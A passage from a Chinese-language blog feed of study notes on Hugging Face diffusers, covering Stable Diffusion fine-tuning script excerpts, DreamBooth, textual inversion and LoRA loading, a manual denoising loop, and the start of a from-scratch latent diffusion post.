class="line"></span><br><span class="line"><span class="comment"># Freeze vae and text_encoder and set unet to trainable</span></span><br><span class="line">vae.requires_grad_(<span class="literal">False</span>)</span><br><span class="line">text_encoder.requires_grad_(<span class="literal">False</span>)</span><br><span class="line">unet.train()</span><br></pre></td></tr></table></figure><h2 id="text-processing">text processing</h2><p>位置:</p><p><a href="https://github.com/huggingface/diffusers/blob/8959c5b9dec1c94d6ba482c94a58d2215c5fd026/examples/text_to_image/train_text_to_image.py#L724">https://github.com/huggingface/diffusers/blob/8959c5b9dec1c94d6ba482c94a58d2215c5fd026/examples/text_to_image/train_text_to_image.py#L724</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">tokenize_captions</span>(<span class="params">examples, is_train=<span class="literal">True</span></span>):</span><br><span class="line">        captions = []</span><br><span class="line">        <span class="keyword">for</span> caption <span class="keyword">in</span> examples[caption_column]:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(caption, <span class="built_in">str</span>):</span><br><span class="line">                captions.append(caption)</span><br><span class="line">            <span class="keyword">elif</span> <span class="built_in">isinstance</span>(caption, (<span class="built_in">list</span>, np.ndarray)):</span><br><span class="line">                <span class="comment"># take a random caption if there are multiple</span></span><br><span class="line">                captions.append(random.choice(caption) <span class="keyword">if</span> is_train <span class="keyword">else</span> caption[<span class="number">0</span>])</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">raise</span> ValueError(</span><br><span class="line">                    <span class="string">f&quot;Caption column `<span class="subst">&#123;caption_column&#125;</span>` should contain either strings or lists of strings.&quot;</span></span><br><span class="line">                )</span><br><span class="line">        inputs = tokenizer(</span><br><span class="line">            captions, max_length=tokenizer.model_max_length, padding=<span class="string">&quot;max_length&quot;</span>, truncation=<span class="literal">True</span>, return_tensors=<span class="string">&quot;pt&quot;</span></span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">return</span> inputs.input_ids</span><br></pre></td></tr></table></figure><h2 id="image-processing">image processing</h2><p>位置:</p><p><a href="https://github.com/huggingface/diffusers/blob/8959c5b9dec1c94d6ba482c94a58d2215c5fd026/examples/text_to_image/train_text_to_image.py#L742">https://github.com/huggingface/diffusers/blob/8959c5b9dec1c94d6ba482c94a58d2215c5fd026/examples/text_to_image/train_text_to_image.py#L742</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Preprocessing the datasets.</span></span><br><span class="line">train_transforms = transforms.Compose(</span><br><span class="line">    [</span><br><span class="line">        transforms.Resize(args.resolution, interpolation=transforms.InterpolationMode.BILINEAR),</span><br><span class="line">        transforms.CenterCrop(args.resolution) <span class="keyword">if</span> args.center_crop <span class="keyword">else</span> transforms.RandomCrop(args.resolution),</span><br><span class="line">        transforms.RandomHorizontalFlip() <span class="keyword">if</span> args.random_flip <span class="keyword">else</span> transforms.Lambda(<span class="keyword">lambda</span> x: x),</span><br><span class="line">        transforms.ToTensor(),</span><br><span class="line">        transforms.Normalize([<span class="number">0.5</span>], [<span class="number">0.5</span>]),</span><br><span class="line">    ]</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h2 id="run-result">run &amp; result</h2><p>官方给出的宝可梦模型训练, 学校机器在被用并不能跑. 很可惜看不了结果了.</p><p>值得一提官方平台也有很多其他人上传的dataset可以自定义使用.</p><p><a href="https://huggingface.co/datasets">https://huggingface.co/datasets</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> MODEL_NAME=<span class="string">&quot;runwayml/stable-diffusion-v1-5&quot;</span></span><br><span class="line"><span class="built_in">export</span> dataset_name=<span class="string">&quot;lambdalabs/pokemon-blip-captions&quot;</span></span><br><span class="line"></span><br><span class="line">accelerate launch --mixed_precision=<span class="string">&quot;fp16&quot;</span>  train_text_to_image.py \</span><br><span class="line">  --pretrained_model_name_or_path=<span class="variable">$MODEL_NAME</span> \</span><br><span class="line">  --dataset_name=<span class="variable">$dataset_name</span> \</span><br><span class="line">  --use_ema \</span><br><span class="line">  --resolution=512 --center_crop --random_flip \</span><br><span class="line">  --train_batch_size=1 \</span><br><span class="line">  --gradient_accumulation_steps=4 \</span><br><span class="line">  --gradient_checkpointing \</span><br><span class="line">  --max_train_steps=15000 \</span><br><span class="line">  --learning_rate=1e-05 \</span><br><span class="line">  --max_grad_norm=1 \</span><br><span class="line">  --enable_xformers_memory_efficient_attention</span><br><span class="line">  --lr_scheduler=<span class="string">&quot;constant&quot;</span> --lr_warmup_steps=0 \</span><br><span class="line">  --output_dir=<span class="string">&quot;sd-pokemon-model&quot;</span> \</span><br><span class="line">  --push_to_hub</span><br></pre></td></tr></table></figure><p>结果可以调用查看. <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> diffusers <span class="keyword">import</span> StableDiffusionPipeline</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"></span><br><span class="line">pipeline = StableDiffusionPipeline.from_pretrained(<span class="string">&quot;path/to/saved_model&quot;</span>, torch_dtype=torch.float16, use_safetensors=<span class="literal">True</span>).to(<span class="string">&quot;cuda&quot;</span>)</span><br><span class="line"></span><br><span class="line">image = pipeline(prompt=<span class="string">&quot;yoda&quot;</span>).images[<span class="number">0</span>]</span><br><span class="line">image.save(<span class="string">&quot;yoda-pokemon.png&quot;</span>)</span><br></pre></td></tr></table></figure></p><h1 id="load-adapter">Load adapter</h1><p>脚本层面的理解是为了能调制出我们自己想要的模型, 如果是有现有的LoRA weight的话也可以直接进行导入.</p><h2 id="可用仓库">可用仓库</h2><p>现有模型:</p><p><a href="https://huggingface.co/spaces/sd-concepts-library/stable-diffusion-conceptualizer">stable-diffusion-conceptualizer</a>, <a href="https://huggingface.co/spaces/multimodalart/LoraTheExplorer">LoraTheExplorer</a>.</p><p>仓库: <a href="https://huggingface.co/spaces/huggingface-projects/diffusers-gallery">diffusers-gallery</a>, <a href="https://civitai.com/">civitai</a></p><h2 id="几个不同模型">几个不同模型</h2><p>也可以直接看youtube视频. <a href="https://www.youtube.com/watch?v=dVjMiJsuR5o">LoRA vs Dreambooth vs Textual Inversion vs Hypernetworks</a></p><h3 id="dreambooth">DreamBooth</h3><p>通过同物品的几张图片以及unique identifier生成其他包含此物品的图片.</p><p>训练方式为整个模型训练, 即tokenizer, text embedding,以及最后的UNet都需要进行训练.</p><p>本质为在原模型基础上重新强行训练一个identifer给一个新特征, 是一个单独的全新的模型.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> diffusers <span class="keyword">import</span> AutoPipelineForText2Image</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"></span><br><span class="line">pipeline = AutoPipelineForText2Image.from_pretrained(<span class="string">&quot;sd-dreambooth-library/herge-style&quot;</span>, torch_dtype=torch.float16).to(<span class="string">&quot;cuda&quot;</span>)</span><br><span class="line">prompt = <span class="string">&quot;A cute herge_style brown bear eating a slice of pizza, stunning color scheme, masterpiece, illustration&quot;</span></span><br><span class="line">image = pipeline(prompt).images[<span class="number">0</span>]</span><br><span class="line">image</span><br></pre></td></tr></table></figure><h3 id="textual-inversion">Textual inversion</h3><p>同样是将特定物品或风格和identifier进行关联. 但是Textual inversion是从text的角度出发,将模型的文本处理部分训练到能够单独输出一个向量给某特定identifier从而让generator生成相关图片.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> diffusers <span class="keyword">import</span> AutoPipelineForText2Image</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"></span><br><span class="line"><span class="comment"># load stable diffusion</span></span><br><span class="line">pipeline = AutoPipelineForText2Image.from_pretrained(<span class="string">&quot;runwayml/stable-diffusion-v1-5&quot;</span>, torch_dtype=torch.float16).to(<span class="string">&quot;cuda&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># load textual inversion</span></span><br><span class="line">pipeline.load_textual_inversion(<span class="string">&quot;sd-concepts-library/gta5-artwork&quot;</span>)</span><br><span class="line">prompt = <span class="string">&quot;A cute brown bear eating a slice of pizza, stunning color scheme, masterpiece, illustration, &lt;gta5-artwork&gt; style&quot;</span></span><br><span class="line">image = pipeline(prompt).images[<span class="number">0</span>]</span><br><span class="line">image</span><br></pre></td></tr></table></figure><h3 id="lora">LoRA</h3><p>通过外嵌adapter,局部微调从而使得模型可以朝某个方向工作. <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> diffusers <span class="keyword">import</span> AutoPipelineForText2Image</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="comment"># load stable diffusion</span></span><br><span class="line">pipeline = AutoPipelineForText2Image.from_pretrained(<span class="string">&quot;stabilityai/stable-diffusion-xl-base-1.0&quot;</span>, torch_dtype=torch.float16).to(<span class="string">&quot;cuda&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># load lora</span></span><br><span class="line">pipeline.load_lora_weights(<span class="string">&quot;ostris/super-cereal-sdxl-lora&quot;</span>, weight_name=<span class="string">&quot;cereal_box_sdxl_v1.safetensors&quot;</span>)</span><br><span class="line">prompt = <span class="string">&quot;bears, pizza bites&quot;</span></span><br><span class="line">image = pipeline(prompt).images[<span class="number">0</span>]</span><br><span class="line">image</span><br></pre></td></tr></table></figure></p><p>大概也就是这些了,下次有空看一下PEFT,然后看下LoRA在GPT层面的应用.</p>]]></content>
      
      
      <categories>
          
          <category> ML </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Diffusers学习(1)</title>
      <link href="/2024/04/21/Diffusers%E5%AD%A6%E4%B9%A0-1/"/>
      <url>/2024/04/21/Diffusers%E5%AD%A6%E4%B9%A0-1/</url>
      
        <content type="html"><![CDATA[<p>ldm的VQGAN还在跑,先来看下huggingface现有的diffusion model的实现框架.</p><p><a href="https://huggingface.co/docs/diffusers/using-diffusers/write_own_pipeline">文档链接</a></p><h2 id="diffusion-modelddpm">diffusion model(ddpm)</h2><h3 id="install">install</h3><p>首先安装和import <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">!pip install diffusers[<span class="string">&quot;torch&quot;</span>] transformers</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> diffusers <span class="keyword">import</span> DDPMPipeline</span><br></pre></td></tr></table></figure></p><h3 id="pipline">pipline</h3><p>pipline简洁代码 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ddpm = DDPMPipeline.from_pretrained(<span class="string">&quot;google/ddpm-cat-256&quot;</span>, use_safetensors=<span class="literal">True</span>).to(<span class="string">&quot;cuda&quot;</span>)</span><br><span class="line">image = ddpm(num_inference_steps=<span class="number">30</span>).images[<span class="number">0</span>]</span><br><span class="line">image</span><br></pre></td></tr></table></figure></p><p><img src="pipline.png" /></p><p>效果其实一般.</p><h3 id="内部细节">内部细节</h3><p>还是和前面看的ddpm一样, Unet加上一个scheduler. 对生成结果进行绘图得到以下结果. <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">from</span> diffusers <span class="keyword">import</span> DDPMScheduler, UNet2DModel</span><br><span class="line"></span><br><span class="line">scheduler = DDPMScheduler.from_pretrained(<span class="string">&#x27;google/ddpm-cat-256&#x27;</span>)</span><br><span class="line">model = UNet2DModel.from_pretrained(<span class="string">&#x27;google/ddpm-cat-256&#x27;</span>, use_safetensors=<span class="literal">True</span>).to(<span class="string">&#x27;cuda&#x27;</span>)</span><br><span class="line">scheduler.set_timesteps(<span class="number">50</span>)</span><br><span class="line"></span><br><span class="line">noice = torch.randn((<span class="number">1</span>,<span class="number">3</span>,model.config.sample_size,model.config.sample_size), device=<span class="string">&#x27;cuda&#x27;</span>)</span><br><span class="line">img_index = <span class="number">0</span></span><br><span class="line">fig = plt.figure(figsize=(<span class="number">15</span>,<span class="number">15</span>))</span><br><span class="line"><span class="keyword">for</span> i, t <span class="keyword">in</span> <span class="built_in">enumerate</span>(scheduler.timesteps):</span><br><span class="line">    <span class="keyword">with</span> torch.no_grad():</span><br><span class="line">        noisy_residual = model(noice, t).sample</span><br><span class="line">    previous_noisy_sample = scheduler.step(noisy_residual, t, noice).prev_sample</span><br><span class="line">    noice = previous_noisy_sample</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">10</span> == <span class="number">0</span>:</span><br><span class="line">        image = (noice / <span class="number">2</span> + <span class="number">0.5</span>).clamp(<span class="number">0</span>, <span class="number">1</span>).squeeze()</span><br><span class="line">        image = (image.permute(<span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>) * <span class="number">255</span>).<span class="built_in">round</span>().to(torch.uint8).cpu().numpy()</span><br><span class="line">        image = Image.fromarray(image)</span><br><span class="line">        plt.subplot(<span class="number">1</span>, <span class="number">10</span>, i//<span class="number">10</span>+<span class="number">1</span>)</span><br><span class="line">        plt.imshow(image)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure></p><p><img src="plot_5img.png" /></p><h2 id="stable-diffusion">stable diffusion</h2><h3 id="pipline-1">pipline</h3><p><a href="https://huggingface.co/docs/diffusers/using-diffusers/conditional_image_generation">Text-to-image</a></p><p>有stable diffusion1.5, stable diffusion XL等等 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> diffusers <span class="keyword">import</span> AutoPipelineForText2Image</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"></span><br><span class="line">pipeline = AutoPipelineForText2Image.from_pretrained(</span><br><span class="line">    <span class="string">&quot;stabilityai/stable-diffusion-xl-base-1.0&quot;</span>, torch_dtype=torch.float16, variant=<span class="string">&quot;fp16&quot;</span></span><br><span class="line">).to(<span class="string">&quot;cuda&quot;</span>)</span><br><span class="line">generator = torch.Generator(<span class="string">&quot;cuda&quot;</span>).manual_seed(<span class="number">31</span>)</span><br><span class="line">image = pipeline(<span class="string">&quot;a bowl of cats, cute&quot;</span>, generator=generator).images[<span class="number">0</span>]</span><br><span class="line">image</span><br></pre></td></tr></table></figure></p><p><img src="stable_diffusion_XL.png" /></p><h3 id="pndmpseudo-numerical-methods-for-diffusion-models-on-manifolds">PNDM(Pseudo Numerical Methods for Diffusion Models on Manifolds)</h3><p>scheduler也是有不少的,从ddpm到ddim到pndm,具体可以看<a href="https://animadversio.github.io/academic_notes/note-on-ddpm-ddim-pndm">Note on Variants of Diffusion Scheduler, DDPM DDIM PNDM</a>.</p><p>大概来说就是ddpm基于markov,ddim是deterministic且对back process做了优化. pndm是对ddim做出了微分方程求解层面的优化.</p><p>不过官方给的说法是stable diffusion默认用pndm,那我们就展现一下换scheduler有多简单,于是用的就是UniPCMultistepScheduler.</p><h3 id="load-from-pretrained">load from pretrained</h3><p>这里区别于前面的UNet,这里的UNet是conditional. 然后encoder用的AutoencoderKL.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">from</span> transformers <span class="keyword">import</span> CLIPTextModel, CLIPTokenizer</span><br><span class="line"><span class="keyword">from</span> diffusers <span class="keyword">import</span> AutoencoderKL, UNet2DConditionModel, PNDMScheduler</span><br><span class="line"><span class="keyword">from</span> diffusers <span class="keyword">import</span> UniPCMultistepScheduler</span><br><span class="line"></span><br><span class="line">vae = AutoencoderKL.from_pretrained(<span class="string">&quot;CompVis/stable-diffusion-v1-4&quot;</span>, subfolder=<span class="string">&quot;vae&quot;</span>, use_safetensors=<span class="literal">True</span>)</span><br><span class="line">tokenizer = CLIPTokenizer.from_pretrained(<span class="string">&quot;CompVis/stable-diffusion-v1-4&quot;</span>, subfolder=<span class="string">&quot;tokenizer&quot;</span>)</span><br><span class="line">text_encoder = CLIPTextModel.from_pretrained(</span><br><span class="line">    <span class="string">&quot;CompVis/stable-diffusion-v1-4&quot;</span>, subfolder=<span class="string">&quot;text_encoder&quot;</span>, use_safetensors=<span class="literal">True</span></span><br><span class="line">)</span><br><span class="line">unet = UNet2DConditionModel.from_pretrained(</span><br><span class="line">    <span class="string">&quot;CompVis/stable-diffusion-v1-4&quot;</span>, subfolder=<span class="string">&quot;unet&quot;</span>, use_safetensors=<span class="literal">True</span></span><br><span class="line">)</span><br><span class="line">scheduler = UniPCMultistepScheduler.from_pretrained(<span class="string">&quot;CompVis/stable-diffusion-v1-4&quot;</span>, subfolder=<span class="string">&quot;scheduler&quot;</span>)</span><br><span class="line"></span><br><span class="line">torch_device = <span class="string">&quot;cuda&quot;</span></span><br><span class="line">vae.to(torch_device)</span><br><span class="line">text_encoder.to(torch_device)</span><br><span class="line">unet.to(torch_device)</span><br></pre></td></tr></table></figure><h3 id="text-processing">text processing</h3><p>文本方面就是先tokenize然后embedding,然后取padding token再做一次embedding最后concat</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># text processing</span></span><br><span class="line">prompt = [<span class="string">&quot;a photograph of a bowl of cats&quot;</span>]</span><br><span class="line">batch_size = <span class="built_in">len</span>(prompt)</span><br><span class="line"></span><br><span class="line"><span class="comment"># tokenizing</span></span><br><span class="line">text_input = tokenizer(</span><br><span class="line">    prompt, padding=<span class="string">&quot;max_length&quot;</span>, max_length=tokenizer.model_max_length, truncation=<span class="literal">True</span>, return_tensors=<span class="string">&quot;pt&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="comment"># generate text embedding</span></span><br><span class="line"><span class="keyword">with</span> torch.no_grad():</span><br><span class="line">    text_embeddings = text_encoder(text_input.input_ids.to(torch_device))[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># generate text embedding for only padding tokens</span></span><br><span class="line">max_length = text_input.input_ids.shape[-<span class="number">1</span>]</span><br><span class="line">uncond_input = tokenizer([<span class="string">&quot;&quot;</span>] * batch_size, padding=<span class="string">&quot;max_length&quot;</span>, max_length=max_length, return_tensors=<span class="string">&quot;pt&quot;</span>)</span><br><span class="line">uncond_embeddings = text_encoder(uncond_input.input_ids.to(torch_device))[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># concat embeddings</span></span><br><span class="line">text_embeddings = torch.cat([uncond_embeddings, text_embeddings])</span><br></pre></td></tr></table></figure><h3 id="train">train</h3><p>这里官方的generator会出问题,用cuda的话记得用<code>torch.cuda.manual_seed</code></p><p>然后思路很简单, 直接check vae的downsample数,然后对维度直接进行调整,生成latent space的random input.</p><p>然后unet里面传入text embedding作为hidden state. 然后这里guidance我不是很理解,大概是unet默认同时传出conditional和unconditional的result,然后这里手动做调整?</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tqdm.auto <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line"><span class="comment"># image settings</span></span><br><span class="line">height = <span class="number">512</span>  <span class="comment"># default height of Stable Diffusion</span></span><br><span class="line">width = <span class="number">512</span>  <span class="comment"># default width of Stable Diffusion</span></span><br><span class="line">num_inference_steps = <span class="number">25</span>  <span class="comment"># Number of denoising steps</span></span><br><span class="line">guidance_scale = <span class="number">7.5</span>  <span class="comment"># Scale for classifier-free guidance</span></span><br><span class="line">generator = torch.cuda.manual_seed(<span class="number">0</span>)  <span class="comment"># Seed generator to create the initial latent noise</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># latent noice</span></span><br><span class="line"><span class="comment"># 2 ** (len(vae.config.block_out_channels) - 1) == 8</span></span><br><span class="line">latents = torch.randn(</span><br><span class="line">    (batch_size, unet.config.in_channels, height // <span class="number">8</span>, width // <span class="number">8</span>),</span><br><span class="line">    generator=generator,</span><br><span class="line">    device=torch_device,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># scaling input with the noice distribution</span></span><br><span class="line">latents = latents * scheduler.init_noise_sigma</span><br><span class="line">scheduler.set_timesteps(num_inference_steps)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> tqdm(scheduler.timesteps):</span><br><span class="line">    <span class="comment"># expand the latents if we are doing classifier-free guidance to avoid doing two forward passes.</span></span><br><span class="line">    latent_model_input = torch.cat([latents] * <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    latent_model_input = scheduler.scale_model_input(latent_model_input, timestep=t)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># predict the noise residual</span></span><br><span class="line">    <span class="keyword">with</span> torch.no_grad():</span><br><span class="line">        noise_pred = unet(latent_model_input, t, encoder_hidden_states=text_embeddings).sample</span><br><span class="line"></span><br><span class="line">    <span class="comment"># perform guidance</span></span><br><span class="line">    noise_pred_uncond, noise_pred_text = noise_pred.chunk(<span class="number">2</span>)</span><br><span class="line">    noise_pred = noise_pred_uncond + guidance_scale * (noise_pred_text - noise_pred_uncond)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># compute the previous noisy sample x_t -&gt; x_t-1</span></span><br><span class="line">    latents = scheduler.step(noise_pred, t, latents).prev_sample</span><br></pre></td></tr></table></figure><h3 id="show-result">show result</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">latents = <span class="number">1</span> / <span class="number">0.18215</span> * latents</span><br><span class="line"><span class="keyword">with</span> torch.no_grad():</span><br><span class="line">    image = vae.decode(latents).sample</span><br><span class="line">image = (image / <span class="number">2</span> + <span class="number">0.5</span>).clamp(<span class="number">0</span>, <span class="number">1</span>).squeeze()</span><br><span class="line">image = (image.permute(<span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>) * <span class="number">255</span>).to(torch.uint8).cpu().numpy()</span><br><span class="line">image = Image.fromarray(image)</span><br><span class="line">image</span><br></pre></td></tr></table></figure><p><img src="bowl_of_cats.png" /></p>]]></content>
      
      
      <categories>
          
          <category> ML </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>从零实现LDM(1)</title>
      <link href="/2024/04/20/%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0LDM-1/"/>
      <url>/2024/04/20/%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0LDM-1/</url>
      
        <content type="html"><![CDATA[<p>代码主要还是来自两个repo <a href="https://github.com/CompVis/latent-diffusion/">CompVis</a>和<a href="https://github.com/dome272/VQGAN-pytorch">outlier</a></p><p>第二个人是一个油管作者,视频讲解很清楚,遇到各种问题也可以从官方或者outlier的代码里面找到问题,不过具体实现和光看论文还是有一些区别.</p><p>这次从零实现LDM是以学习为目的,一定要说的话<strong>确实是造轮子</strong>,需要成品直接去官方搬就行了. 官方文档写的也挺清楚的了.</p><p><a href="https://github.com/blacsheep/ldm-pytorch">github repo地址</a></p><h2 id="vq构成">VQ构成</h2><h3 id="residual层">Residual层</h3><p>d2l的残差块, 后续encoder的decoder里面会用到. 残差块的思路都是一样的,在核心部分也只是填充作用,不多做解释.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https://zh.d2l.ai/chapter_convolutional-modern/resnet.html</span></span><br><span class="line"><span class="comment"># the most basic ResNet structure</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Residual</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, input_channels, num_channels,</span></span><br><span class="line"><span class="params">                 use_1x1conv=<span class="literal">False</span>, strides=<span class="number">1</span></span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        self.conv1 = nn.Conv2d(input_channels, num_channels,</span><br><span class="line">                               kernel_size=<span class="number">3</span>, padding=<span class="number">1</span>, stride=strides)</span><br><span class="line">        self.conv2 = nn.Conv2d(num_channels, num_channels,</span><br><span class="line">                               kernel_size=<span class="number">3</span>, padding=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> use_1x1conv:</span><br><span class="line">            self.conv3 = nn.Conv2d(input_channels, num_channels,</span><br><span class="line">                                   kernel_size=<span class="number">1</span>, stride=strides)</span><br><span 